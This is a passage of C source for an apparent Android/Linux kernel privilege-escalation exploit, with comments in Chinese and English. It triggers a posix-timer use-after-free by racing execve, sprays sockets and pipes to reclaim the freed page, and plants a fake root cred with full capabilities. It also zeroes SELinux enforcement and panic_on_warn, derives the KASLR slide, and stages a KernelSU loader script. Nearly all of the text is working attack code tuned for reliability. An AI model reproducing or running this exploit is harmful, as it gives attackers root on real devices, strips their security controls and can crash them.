						if (top_n[k] < top_n[m])
							m = k;
					if (top_n[m] < 1) {
						top[m] = l;
						top_n[m] = 1;
					}
				}
			}
			uint64_t sample = 0;

			for (int i = 0; i < cnt; i++)
				if (evs[i].type == EV_CACHE_ALLOC && evs[i].site &&
				    (evs[i].site & 0x1fffffULL) == (uint64_t)TIMER_SITE_LOW21) {
					sample = evs[i].site;
					break;
				}
			logf("[base] want low21=%#llx; cache_alloc top3 = %#llx x%d / %#llx x%d / %#llx x%d\n",
			     (unsigned long long)TIMER_SITE_LOW21,
			     (unsigned long long)top[0], top_n[0],
			     (unsigned long long)top[1], top_n[1],
			     (unsigned long long)top[2], top_n[2]);
			logf("[base] sample site=%#llx static=%#llx slide=%lld\n",
			     (unsigned long long)sample,
			     (unsigned long long)STATIC_TIMER_SITE,
			     (long long)(sample - STATIC_TIMER_SITE));
		}
	}

#if EXTRACTKIT_BASE_FALLBACK
	for (int i = 0; i < cnt; i++) {
		if (evs[i].type == EV_PAGE_ALLOC && evs[i].order == 1) {
			if (rn < 32) {
				recent[rn++] = evs[i].pfn;
			} else {
				memmove(recent, recent + 1, 31 * sizeof(*recent));
				recent[31] = evs[i].pfn;
			}
		} else if (evs[i].type == EV_CACHE_ALLOC && rn &&
			   evs[i].req && evs[i].ptr && is_kernel_ptr(evs[i].ptr)) {
			/* 以前只认「req==alloc==itimer 尺寸」，可 6.1.157 上 kmem_cache_alloc
			 * 走的是 _node、且 id 读不到，结果 timer_allocs=0 → 一个候选都没有。
			 * base 只关心「某块 slab 的内核指针 + 刚分配的 order-1 页」，尺寸无关。*/
			uint64_t slab = evs[i].ptr & ~0x1fffULL;

			/* 只跟「最近的几页」配对：喷涂序列是「先分配 order-1 页、
			 * 再在页内分配 timer 对象」，任意配对会把无关组合也投上去。
			 * 而且 base 必须是 2 MiB 对齐且落在直映射区间，否则直接丢弃。*/
			int lo = 0;

			for (int j = lo; j < rn; j++) {
				uint64_t b = slab - (recent[j] << 12);
				int f = 0;

				if (!is_kernel_ptr(b))
					continue;
				if ((b & 0x1fffffULL) != 0)
					continue;
				if (b < 0xffffffc000000000ULL || b >= 0xffffffd000000000ULL)
					continue;
				for (int k = 0; k < hc; k++)
					if (hist[k] == b) {
						hist_n[k]++;
						f = 1;
						break;
					}
				if (!f && hc < 64) {
					hist[hc] = b;
					hist_n[hc] = 1;
					hc++;
				}
			}
		}
	}
	for (int k = 0; k < hc; k++)
		if (hist_n[k] > best_n) {
			best_n = hist_n[k];
			best = k;
		}
	best_base = hist_n[best] >= 8 ? hist[best] : 0;
	logf("[base] candidates=%d best=%#llx votes=%d%s\n", hc,
	     (unsigned long long)best_base, best_n,
	     best_base ? "" : " (no valid candidate: need 2MiB-aligned + direct-map)");
#else
	/* 页配对只作诊断：本月它的假 READY（0xffffef513fa5a000 未对齐、
	 * 0xffffff7f80000000）比成功更多，默认关闭。*/
	(void)recent;
	(void)rn;
	(void)best_n;
	best_base = 0;
	logf("[base] page-pairing disabled (EXTRACTKIT_BASE_FALLBACK=0)\n");
#endif
	return best_base;
}

static int prepare_fragmented_range(void)
{
	size_t len = (size_t)VMA_COUNT * PAGE;
	int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
	void *base;

	if (fd < 0 || ftruncate(fd, PAGE))
		return -1;
	base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED) {
		close(fd);
		return -1;
	}
	for (unsigned long i = 0; i < VMA_COUNT; i++) {
		void *want = (char *)base + i * PAGE;

		if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) !=
		    want) {
			close(fd);
			return -1;
		}
	}
	close(fd);
	g_frag_base = base;
	g_frag_len = len;
	return 0;
}

static int locker_fn(void *x)
{
	int prot = PROT_NONE;
	unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);

	(void)x;
	pin(slot ? 3 : 1);
	while (!atomic_load(&g_go))
		sched_yield();
	atomic_fetch_add(&g_locker_started, 1);
	while (!atomic_load(&g_stop)) {
		(void)syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	_exit(0);
}

static int killer_fn(void *x)
{
	int tid, tgid;

	(void)x;
	pin(2);
	while (!(tid = atomic_load(&g_exec_tid)))
		sched_yield();
	tgid = atomic_load(&g_target_tgid);
	for (;;) {
		long r = syscall(SYS_tgkill, tgid, tid, 0);

		if (r < 0 && errno == ESRCH)
			break;
		sched_yield();
	}
	(void)syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	atomic_store(&g_stop, 1);
	_exit(0);
}

static int spawn_vm_helper(int (*fn)(void *))
{
	void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	int p;

	if (st == MAP_FAILED)
		return -1;
	p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
	if (p < 0)
		munmap(st, HELPER_STACK);
	return p;
}

/* Fill posix_timers_cache with live objects so a fresh slab (and therefore a
 * new order-1 page) has to be created for the victim. Returns the number of
 * padding timers actually created; the caller must delete them after the
 * victim has been forked. */
static int create_slab_padding(timer_t *ids, int max)
{
	struct sigevent ev;
	int made = 0;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < max; i++) {
		if (timer_create(CLOCK_MONOTONIC, &ev, &ids[i]))
			break;
		made++;
	}
	return made;
}

static void delete_slab_padding(timer_t *ids, int n)
{
	for (int i = 0; i < n; i++)
		(void)timer_delete(ids[i]);
}

/* The victim timer has to belong to a non-leader thread, and its task must be
 * the one whose posix_cputimers queue keeps the stale node. Timer index
 * VICTIM_IDX is the one that stays armed, so its k_itimer address is later
 * used as V. */
static void *exec_thread(void *x)
{
	struct sigevent ev_none, ev_victim;
	struct itimerspec dormant;
	char b = 'R', ack;
	char *const argv[] = { (char *)"", NULL };
	char *const envp[] = { NULL };

	(void)x;
	pin(2);
	if (prctl(PR_SET_NAME, "timer-exec", 0, 0, 0))
		_exit(119);
	memset(&ev_none, 0, sizeof(ev_none));
	ev_none.sigev_notify = SIGEV_NONE;
	memset(&ev_victim, 0, sizeof(ev_victim));
	ev_victim.sigev_notify = SIGEV_SIGNAL;
	ev_victim.sigev_signo = SIGRTMIN;
	memset(&dormant, 0, sizeof(dormant));
	dormant.it_value.tv_sec = 3600;

	if (write(g_ready_w, &b, 1) != 1)
		_exit(117);
	if (read(g_ack_r, &ack, 1) != 1)
		_exit(118);

	for (int i = 0; i < NTIMERS; i++) {
		timer_t t;
		struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;

		if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
			_exit(120);
		if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
			_exit(121);
	}
	{
		int tid = (int)syscall(SYS_gettid);

		atomic_store(&g_exec_tid, tid);
		if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
			_exit(122);
	}
	atomic_store(&g_go, 1);
	while (atomic_load(&g_locker_started) < LOCKERS)
		sched_yield();
	for (volatile unsigned long i = 0; i < 5000000UL; i++)
		__asm__ volatile("" ::: "memory");
	/* Fails: the mprotect() write lock on the fragmented range makes
	 * exec_mmap()'s mmap_read_lock_killable() return -EINTR. */
	execve("/proc/self/exe", argv, envp);
	_exit(123);
}

static void run_target(void)
{
	pthread_t th;
	sigset_t set;

	atomic_store(&g_target_tgid, (int)getpid());
	pin(2);
	if (prepare_fragmented_range())
		_exit(110);
	for (int i = 0; i < LOCKERS; i++)
		if (spawn_vm_helper(locker_fn) < 0)
			_exit(111);
	if (spawn_vm_helper(killer_fn) < 0)
		_exit(112);
	sigemptyset(&set);
	sigaddset(&set, SIGRTMIN);
	pthread_sigmask(SIG_BLOCK, &set, NULL);
	if (pthread_create(&th, NULL, exec_thread, NULL))
		_exit(114);
	for (;;)
		sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
	struct timespec pause = { .tv_nsec = 10000000 };

	for (int i = 0; i < 400; i++) {
		memset(si, 0, sizeof(*si));
		if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (si->si_pid == pid)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}


/* MODE_ZERO clears the erase target, MODE_PTR writes the stale node's own
 * address (used to seed cap_effective during bring-up), MODE_FAKE plants a
 * full fake cred over the reclaimed page. */
enum payload_mode { MODE_ZERO = 0, MODE_PTR = 1, MODE_FAKE = 2 };

static uint64_t g_fake_A;

struct plant_res {
	uint64_t V, A, slab_pfn;
	int exact;
	int ok;
	int retry;
};

static void run_plant(uint64_t target, int tag, struct plant_res *res,
		      int selftest, int mode);

/* YuKongA's final stage, verbatim except for this device's KMI. It resolves
 * the installed KernelSU manager's libksud.so and late-loads the matching
 * module; nothing here re-implements KernelSU. */
static void write_ksu_script(void)
{
	int fd = open("/data/local/tmp/ksu_stage.sh",
		      O_WRONLY | O_CREAT | O_TRUNC, 0755);

	if (fd < 0)
		return;
	(void)!write(fd, KSU_STAGE_SCRIPT, sizeof(KSU_STAGE_SCRIPT) - 1);
	close(fd);
	(void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
}

static int read_panic_on_warn(void)
{
	FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
	int value = -1;

	if (f) {
		if (fscanf(f, "%d", &value) != 1)
			value = -1;
		fclose(f);
	}
	logf("[ksu] panic_on_warn=%d\n", value);
	return value;
}

static int read_selinux_enforce(void);
static int read_panic_on_warn(void);

static int verify_enforce_zero(void) { return read_selinux_enforce() == 0; }

static int verify_panic_zero(void) { return read_panic_on_warn() == 0; }

static int read_selinux_enforce(void)
{
	FILE *f = fopen("/sys/fs/selinux/enforce", "r");
	int value = -1;

	if (f) {
		if (fscanf(f, "%d", &value) != 1)
			value = -1;
		fclose(f);
	}
	return value;
}

/* 写完之后必须能观测到效果才算成功（写进别人的页时 rb_erase 也会
 * 正常返回，只有读回值能区分）。调用方按阶段挂上对应的校验函数。*/
static int (*g_stage_verify)(void);

/* 读子进程 /proc/PID/status 的 Uid 四段，全 0 才算 uid=0。
 * gaaa 的 [real_cred] pass %d/4 -> uid=%u r=%u 就是拿这个值做判据。 */
static int read_child_uid(int pid)
{
	char path[64], line[256];
	FILE *pf;
	int u = -1;

	snprintf(path, sizeof(path), "/proc/%d/status", pid);
	pf = fopen(path, "r");
	if (!pf)
		return -1;
	while (fgets(line, sizeof(line), pf)) {
		if (!strncmp(line, "Uid:", 4)) {
			int a = -1, b = -1, c = -1, d = -1;

			if (sscanf(line, "Uid:\t%d\t%d\t%d\t%d", &a, &b, &c, &d) == 4)
				u = (a == 0 && b == 0 && c == 0 && d == 0) ? 0 : 1;
			else
				u = -2;			/* 段数不足 = 观测失败，不是「非 0」 */

			break;
		}
	}
	fclose(pf);

	return u;
}

/* 崩溃可读的阶段标记：panic 时 stdout 会丢，这个文件用 O_SYNC 落盘，
 * 重启后读它就知道「上次止于哪一步」。零风险、不写内核。*/
static void mark_stage(const char *what, uint64_t v, unsigned long pfn)
{
	char buf[160];
	int fd, n;

	n = snprintf(buf, sizeof(buf), "%s V=%#llx pfn=%#lx\n", what,
		     (unsigned long long)v, pfn);
	fd = open("/data/local/tmp/extract-kit/last_stage",
		  O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
	if (fd < 0)
		return;
	if (write(fd, buf, (size_t)n) < 0) {
		close(fd);
		return;
	}
	fsync(fd);
	close(fd);
}

static int stage_write(uint64_t target, int mode, const char *what,
		       struct plant_res *out)
{
	struct plant_res r;

	/* 零写（selinux / panic_on_warn / fake_uid）每次只碰 8 字节的结构性
	 * 地址，失手不会破坏别的对象，所以允许比 fake cred 更多次重试；
	 * fake cred 每次失败都会留下一个僵尸，次数要保守。
	 * 另外 g_held 到 4 就停手：僵尸不能 reap，多留只会白占内存。*/
	/* MODE_ZERO 只允许 1 次：每次零写都会给该 timer base 留下一个指向
	 * task_struct 的坏 rb_root，重复 erase 会叠加，是“补 3 次就 panic”
	 * 的机理。MODE_FAKE 仍可 3 次（失败只是没装上）。 */
	int tries = (mode == MODE_FAKE) ? 3 : 1;

	for (int attempt = 1; attempt <= tries; attempt++) {
		if (g_held >= 4) {
			logf("[!] stage %s abandon: held=%d\n",
			     what, g_held);
			return -1;
		}
		memset(&r, 0, sizeof(r));
		logf("[+] stage %s target=%#llx mode=%s attempt=%d/%d\n", what,
		     (unsigned long long)target,
		     mode == MODE_FAKE ? "fake" : "zero", attempt, tries);
		run_plant(target, 1, &r, 0, mode);
		if (r.ok && g_stage_verify && !g_stage_verify()) {
			logf("[!] stage %s verify failed; retry\n", what);
			r.ok = 0;
			r.retry = 1;
		}
		if (r.ok) {
			if (out)
				*out = r;
			return 0;
		}
		if (!r.retry) {
			logf("[-] stage %s failed\n", what);
			return -1;
		}
		logf("[~] stage %s retry (window miss; new victim)\n", what);
	}
	logf("[-] stage %s exhausted retries (%d)\n", what, tries);
	return -1;
}

static void park_forever(const char *why)
{
	logf("[!] %s -- parking without reap (zombie held)\n", why);
	logf("[!] reboot the device to clean up; do not kill this process\n");
	for (;;)
		pause();
}

/*
 * 提权成功之后，尽量把不再需要的东西还回去。
 *
 * 能还：
 *   - VMA 喷：munmap 掉 195 MiB 虚拟区间，内核里 5 万个 vma 结构（~10 MiB slab）
 *     和对应 PTE 立刻回收。这一块只在"让 exec 的 mmap 落到目标位置"时有用，
 *     成功之后完全多余。
 *
 * 不能还（这三样是提权结果本身的一部分）：
 *   - socket 喷：fake cred 就写在其中某个 socket 页里。2048 对 socket 里我们
 *     无法判定是哪一页（内核不回传映射关系），关掉任何一个都可能把 cred 所在
 *     页还给 buddy → task->cred 悬空 → 下次访问 cred 立即 panic。
 *   - 被 UAF 的 k_itimer：它已经 free 过一次，但 timer 队列里仍引用它的
 *     timerqueue_node，再碰一次就是 double free。
 *   - 本进程：不能 exit，一退 cred 引用计数走 put_cred → 同样踩到悬空页。
 *
 * 所以"内存溢出"只能消掉 ~12 MiB（VMA 相关），剩下 ~20 MiB 是驻留成本，
 * 想彻底释放只有重启。
 */
static long read_slab_kb(void)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char line[128];
	long kb = -1;

	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		if (!strncmp(line, "Slab:", 5)) {
			kb = strtol(line + 5, NULL, 10);
			break;
		}
	}
	fclose(f);
	return kb;
}

static void post_success_trim(void)
{
	long slab0 = read_slab_kb();

	if (g_frag_base && g_frag_len) {
		size_t len = g_frag_len;

		if (!munmap(g_frag_base, len))
			logf("[trim] released vma spray: %zu MiB + %d vmas\n",
			     len >> 20, VMA_COUNT);
		else
			logf("[!] munmap vma spray failed: errno=%d\n", errno);
		g_frag_base = NULL;
		g_frag_len = 0;
	}
	if (slab0 >= 0)
		logf("[trim] Slab: %ld kB -> %ld kB\n", slab0, read_slab_kb());
	logf("[trim] kept: socket spray (cred page) + resident child\n");
}

/* Payload page: all zeros except the stale node's rb_left = S.
 *
 * The erased node is `p` (the stale timerqueue_node inside the freed
 * k_itimer). __rb_erase_augmented() reads:
 *     child = p->rb_right (0), tmp = p->rb_left (S), pc = p->__rb_parent_color
 * Since child == 0 it takes "still case 1, child is node->rb_left":
 *     tmp->__rb_parent_color = pc = 0;
 *     parent = __rb_parent(pc) = 0;
 *     __rb_change_child(p, S, 0, root)  -> root->rb_node = S
 * i.e. exactly one 8-byte zero write, at S. The offset of the node inside the
 * page must be computed from the slab base: an order-1 posix_timers_cache slab
 * holds 31 objects across two 4K halves and the victim may sit in either. */
/* Payload modes.
 *
 * MODE_ZERO:  __rb_parent_color = 0        -> rb_erase writes 0 to S.
 * MODE_PTR:   __rb_parent_color = A (self) -> RB_EMPTY_NODE() is true, so
 *             rb_next() returns NULL without dereferencing, and the erase
 *             writes pc (= A, the stale node's own kernel address) to S.
 * Both take the case-1-left path and perform one 8-byte write.
 */
/*
 * call site 软匹配（默认开）。
 *
 * 三处 call site 是 _RET_IP_ & 0x1fffff，属于"代码布局"常量：换一个内核 build
 * 就变，而且 BTF / kallsyms 都给不出来。但它们本来只是**收窄条件** —— 每条记录
 * 都同时有尺寸过滤（k_itimer 0x108 / cred 0xb8→0xc0 / task_struct 0x12c0），
 * 尺寸来自 BTF，是自适应的。
 *
 * 所以这里把 site 降级为"加分项"：尺寸对就接受，site 不匹配只打一行告警。
 * 想恢复严格匹配：设环境变量 EXTRACTKIT_STRICT_SITE=1。
 */


/* selinux_state.builtin/... the LSM blob is opaque; only the first two
 * sids are written, exactly as the reference exploit does. */
struct cred_blob {
	uint32_t sid[16];
};

/* Pick a 0x40-byte window for the SELinux blob that does not overlap the
 * fake cred (cred is 0xb8 bytes at page_off). */
static size_t fake_blob_offset(size_t page_off)
{
	static const size_t cand[] = {0x1f00, 0x1000, 0x1800, 0x800, 0x100, 0x0};

	/* 第一候选是标定给的 CRED_BLOB_OFF（默认 0x1f00），其余是兜底 */
	for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++) {
		size_t b = i == 0 ? (size_t)CRED_BLOB_OFF : cand[i];

		if (b + 0x40 > PAGE)
			continue;
		/* 判重叠必须按整个 cred 算（CRED_ALLOC ≈ 0xc0），不能只用 0x40 的
		 * LSM blob —— 否则 blob 可能压在 cred 的 caps/security 字段上。*/
		if (b + 0x40 <= page_off || page_off + (size_t)CRED_ALLOC <= b)
			return b;
	}
	return (size_t)-1;
}

static void build_payload(unsigned char *buf, size_t page_off, uint64_t s_addr,
			  uint64_t node_addr, int mode)
{
	memset(buf, 0, SOCKBUF);
	/* rb_node: __rb_parent_color@0, rb_right@8, rb_left@16 */
	if (mode == MODE_PTR)
		*(uint64_t *)(buf + page_off + 0x00) = node_addr;
	*(uint64_t *)(buf + page_off + 0x10) = s_addr;
}

/* Fake cred laid out exactly like struct cred (BTF-verified offsets) and
 * planted over the stale node; task->cred then points at it. */
static void build_fake_cred(unsigned char *buf, size_t off, uint64_t parent,
			    uint64_t s_addr, uint64_t page, size_t blob)
{
	uint64_t *c = (uint64_t *)(buf + off);

	memset(buf, 0, SOCKBUF);
	/* rb_node overlaid with the cred: rb_right@0x08 (must be NULL so the
	 * erase takes the rb_left path), rb_left@0x10 = the slot to write
	 * (task->cred), __rb_parent_color@0x00 = A (self, so RB_EMPTY_NODE is
	 * true and __rb_parent(pc) stays inside our own page).
	 * As a cred: usage@0x00, uid/gid@0x08, suid/sgid@0x10. The erase
	 * leaves usage = A and suid/sgid = the target; uid/gid get dirtied by
	 * __rb_change_child and are repaired by the later zero write. */
	*(uint64_t *)(buf + off + 0x00) = parent;
	*(uint64_t *)(buf + off + 0x10) = s_addr;
	/* 8 个 id（uid/gid/suid/sgid/euid/egid/fsuid/fsgid）在 cred 里是连续
	 * 的 8 个 u32，起点由 CRED_UID_OFF 决定：5.x/6.1 是 4（=c[1]），
	 * 6.6+ 是 8（=c[2]）。早前按 6.x 写死 c[3]/c[4]/c[5]，在 uid@4 的内核上
	 * 实际改到的是 suid/sgid/cap_inheritable —— euid/fsgid 留着 rb_erase
	 * 的脏值，于是「uid=0 但 euid 是垃圾、su 起不来」。 */
	{
		int iu = (int)(CRED_UID_OFF / 4);	/* 1 或 2 */
		for (int i = 0; i < 8; i++)
			c[iu + i] = 0;			/* uid..fsgid 全清 */
		/* caps 紧随 securebits 之后：uid@4 → 0x28，uid@8 → 0x30。 */
		/* caps 五组紧贴在 security 之前（中间只隔着 4 个 keyring 指针，
		 * 共 0x50 字节），所以用 security 反推比用 uid 猜更可靠：
		 * uid@4 时 0x78-0x50=0x28(=10)，uid@8 时 0x80-0x50=0x30(=12)。 */
		int cw = (int)((CRED_OFF_SECURITY - 0x50) / 4);
		if (cw < 8 || cw > 24)
			cw = (CRED_UID_OFF >= 8) ? 12 : 10;	/* 布局异常时退回老经验值 */
		for (int i = 0; i < 5; i++)
			c[cw + i] = FULLCAP;	/* inh/prm/eff/bset/amb */
	}
	/* 关键：id 清零把 off+0x10 覆盖成 0，而 rb_erase 只有看到
	 * rb_left != 0 才会执行 tmp->__rb_parent_color = pc 去写 [S]
	 * （task->cred）。所以这里必须把 rb_left 补回来，否则 cred
	 * 根本没装上，而阶段只看 hit 就会误报成功。 */
	*(uint64_t *)(buf + off + 0x10) = s_addr;
	*(uint64_t *)(buf + off + CRED_OFF_SECURITY) = page + blob;
	*(uint64_t *)(buf + off + CRED_OFF_USER) = ROOT_USER_STATIC + g_slide;
	*(uint64_t *)(buf + off + CRED_OFF_USER_NS) = INIT_USER_NS_STATIC + g_slide;
	/* 5.10 起 cred 里还没有 ucounts（5.14 才引入）：此时 CRED_OFF_UCOUNTS 与
	 * CRED_OFF_GROUPS 相同，再写就是把 group_info 覆盖成内核指针，必崩。 */
	if (INIT_UCOUNTS_STATIC != 0 && CRED_OFF_UCOUNTS != CRED_OFF_GROUPS)
		*(uint64_t *)(buf + off + CRED_OFF_UCOUNTS) = INIT_UCOUNTS_STATIC + g_slide;
	*(uint64_t *)(buf + off + CRED_OFF_GROUPS) = INIT_GROUPS_STATIC + g_slide;
	*(uint32_t *)(buf + blob + SELINUX_BLOB_OFF) = SELINUX_SID_KERNEL;
	*(uint32_t *)(buf + blob + SELINUX_BLOB_OFF + 4) = SELINUX_SID_KERNEL;
}

static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static _Atomic int g_burst, g_burst2, g_stop_spray;

struct spray_arg {
	unsigned char *payload;
	int sock_first, sock_count, cpu;
	_Atomic int tid;
};

static void ensure_pool(void)
{
	int snd = 16 << 20;

	if (g_pool_n)
		return;
	for (int i = 0; i < SPRAY_SOCKS; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
			break;
		(void)setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd,
				 sizeof(snd));
		(void)setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd,
				 sizeof(snd));
		g_pool_n++;
	}
	if (!g_pool_n)
		park_forever("no spray sockets");
}

/* The three spray threads are the only tasks allowed to hand the freed slab
 * page to us: anything else that grabs it leaves a page we do not control, and
 * reaping against that would panic. */
static int tid_is_spray_tid(int tid, struct spray_arg *args)
{
	if (tid <= 0)
		return 0;
	for (int i = 0; i < SPRAY_THREADS; i++)
		if (atomic_load(&args[i].tid) == tid)
			return 1;
	return 0;
}

static void *spray_thread(void *x)
{
	struct spray_arg *a = x;
	int w = 0;

	atomic_store(&a->tid, (int)syscall(SYS_gettid));
	pin(a->cpu);
	while (!atomic_load(&g_burst))
		sched_yield();
	/* Phase 1 races the free; phase 2 is the burst released the instant the
	 * free is observed, so the next allocation is far more likely ours. */
	while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE) {
		int k = a->sock_first + (w % a->sock_count);

		if (write(g_pool[k][0], a->payload, SOCKBUF) != SOCKBUF)
			break;
		w++;
	}
	while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
		sched_yield();
	while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST) {
		int k = a->sock_first + (w % a->sock_count);

		if (write(g_pool[k][0], a->payload, SOCKBUF) != SOCKBUF)
			break;
		w++;
	}
	return NULL;
}

/* Self-test target: the reclaimed slab page itself. Once the freed order-1
 * page is handed to our socket it stays linearly mapped at the same VA, so
 * [slab_base] = 0 writes a zero into the first 8 bytes of *our own* payload
 * page. A clean return proves the payload landed and the erase really is a
 * single 8-byte zero write; it cannot damage any kernel object. */
static uint64_t self_test_target(uint64_t V) { return V & ~0x1fffULL; }

/* ---- pipe 页级 reclaim（HAPT 的兜底思路） --------------------------
 * 插座喷雾靠概率把对象页抢回来；这里改用 pipe 缓冲页确定性取页：
 * 受害者页刚被释放，per-cpu page list 是 LIFO，紧接着分配的页极可能
 * 就是它。blob 已按 off 摆在 payload[] 里，整页写下去就等于把 fake
 * cred 铺到受害者页上。返回成功写入 4 KiB 的管道数。*/
static int pipe_plant(const unsigned char *payload, size_t off)
{
	int wrote = 0;
	/* 对象可能落在 8 KiB 载荷的第一页或第二页：按 off 所在页取那 4 KiB。
	 * 旧版只处理第一页，`(V & 0x1fff) + ITIMER_NODE` 超过 4096 时直接
	 * 放弃（真机上一半的槽位都在第二页）。*/
	size_t pg = off / 4096;
	const unsigned char *src = payload + pg * 4096;

	if (pg > 1 || off + CRED_ALLOC > (size_t)SOCKBUF)
		return 0;
	for (int i = 0; i < 16; i++) {
		int pfd[2];

		if (pipe(pfd) != 0)
			break;
		if (write(pfd[1], src, 4096) == 4096)
			wrote++;
		/* 故意不 close：关掉页就还回去了 */
	}
	return wrote;
}

static void run_plant(uint64_t target, int tag, struct plant_res *res,
		      int selftest, int mode)
{
	int ready_p[2], ack_p[2], tid_p[2];
	pid_t T;
	siginfo_t si;
	char ch;
	int etid = 0;
	long n;
	int cnt, nrec = 0, free_seen = 0, hit = 0, foreign = 0, slab_own = 0;
	uint64_t V = 0, site0 = 0, slab_pfn = 0, vslab;
	size_t off;
	unsigned char *payload;
	pthread_t th[SPRAY_THREADS];
	struct spray_arg args[SPRAY_THREADS];
	static timer_t padding[PADDING_TIMERS];
	int padding_n = 0;
	long t0, t1 = 0;
	int per;
	int aargs_cpu[SPRAY_THREADS];

	memset(res, 0, sizeof(*res));
	/* Fill the timer cache before forking the victim.
	 * 数量优先用 device.cfg 里的 padding_timers（数组仍按 PADDING_TIMERS 开）。*/
	padding_n = create_slab_padding(padding, g_pad_timers);
	logf("[+] plant%d slab padding=%d\n", tag, padding_n);
	if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p)) {
		logf("[-] plant%d pipe failed\n", tag);
		return;
	}
	T = fork();
	if (T < 0) {
		logf("[-] plant%d fork failed\n", tag);
		return;
	}
	if (T == 0) {
		close(ready_p[0]);
		close(ack_p[1]);
		close(tid_p[0]);
		g_ready_w = ready_p[1];
		g_ack_r = ack_p[0];
		g_tid_w = tid_p[1];
		run_target();
		_exit(115);
	}
	close(ready_p[1]);
	close(ack_p[0]);
	close(tid_p[1]);

	if (read(ready_p[0], &ch, 1) != 1) {
		logf("[-] plant%d trigger never ready\n", tag);
		kill(T, SIGKILL);
		waitpid(T, NULL, 0);
		return;
	}
	trace_start();
	if (write(ack_p[1], "A", 1) != 1)
		logf("[-] plant%d ack failed\n", tag);
	if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
		logf("[-] plant%d exec tid not received\n", tag);

	if (wait_zombie(T, &si)) {
		logf("[-] plant%d no zombie; holding child\n", tag);
		trace_stop();
		g_held++;
		return;
	}
	logf("[+] plant%d target=%d etid=%d code=%d status=%d\n", tag, T, etid,
	     si.si_code, si.si_status);
	if (si.si_code != CLD_KILLED) {
		trace_stop();
		logf("[-] plant%d reap status not SIGKILL; holding zombie\n",
		     tag);
		g_held++;
		return;
	}

	cnt = harvest(g_evs, 400000);
	for (int i = 0; i < cnt; i++) {
		if (g_evs[i].type != EV_CACHE_ALLOC ||
		    g_evs[i].pid != etid)
			continue;
		if (g_evs[i].site != 0 &&
		    !LOW21_EQ((g_evs[i].site & 0x1fffff), TIMER_SITE_LOW21)) {
			if (!g_site_soft)
				continue;
			if (!g_site_fallback_logged) {
				g_site_fallback_logged = 1;
				logf("[!] timer site %#llx != %#llx; soft match by size %#llx\n",
				     (unsigned long long)(g_evs[i].site & 0x1fffff),
				     (unsigned long long)TIMER_SITE_LOW21,
				     (unsigned long long)TIMER_OBJ);
			}
		}
		if (TIMER_OBJ != 0 &&
		    (g_evs[i].req != TIMER_OBJ || g_evs[i].alloc != TIMER_OBJ))
			continue;
		if (nrec == 0)
			site0 = g_evs[i].site;
		if (nrec == VICTIM_IDX)
			V = g_evs[i].ptr;
		nrec++;
	}
	if (!V || !site0) {
		trace_stop();
		logf("[-] plant%d victim not captured (recs=%d); retryable\n",
		     tag, nrec);
		res->retry = 1;
		return;
	}
	if (TIMER_OBJ == 0) {
		trace_stop();
		logf("[-] plant%d reject: TIMER_OBJ==0 (offsets-only); CHAIN_STOP\n", tag);
		free(payload);
		res->ok = -1;
		res->retry = 0;
		return;
	}
	slab_pfn = ((V - g_base) >> 12) & ~1ULL;
	vslab = V & ~0x1fffULL;
	/* site0 is the do_timer_create call site that allocated this timer;
	 * its runtime address minus the link-time address is the KASLR slide.
	 * offsets-only 模式下没有 link-time 地址（STATIC_TIMER_SITE==0），
	 * slide 保持 0：默认路径不使用它，fake-cred 路径已被关闭。*/
	g_slide = g_slide_env ? g_slide_env
		: (STATIC_TIMER_SITE ? site0 - STATIC_TIMER_SITE : 0);
	if (g_slide_env)
		logf("[+] slide external=%#llx\n", (unsigned long long)g_slide_env);
	for (int i = 0; i < cnt; i++)
		if (g_evs[i].type == EV_CACHE_ALLOC &&
		    g_evs[i].pid == etid &&
		    (TIMER_OBJ == 0 || (g_evs[i].req == TIMER_OBJ &&
		     g_evs[i].alloc == TIMER_OBJ)) &&
		    (g_evs[i].ptr & ~0x1fffULL) == vslab)
			slab_own++;
	logf("[+] plant%d V=%#llx A=%#llx slab_pfn=%#llx half=%d recs=%d slab_own=%d/31 slide=%#llx\n",
	     tag, (unsigned long long)V,
	     (unsigned long long)(V + ITIMER_NODE),
	     (unsigned long long)slab_pfn, (int)((V >> 12) & 1), nrec,
	     slab_own, (unsigned long long)g_slide);

	if (selftest) {
		uint64_t alias = self_test_target(V);

		logf("[+] plant%d SELFTEST target=A_alias=%#llx (was %#llx)\n",
		     tag, (unsigned long long)alias,
		     (unsigned long long)target);
		target = alias;
	}
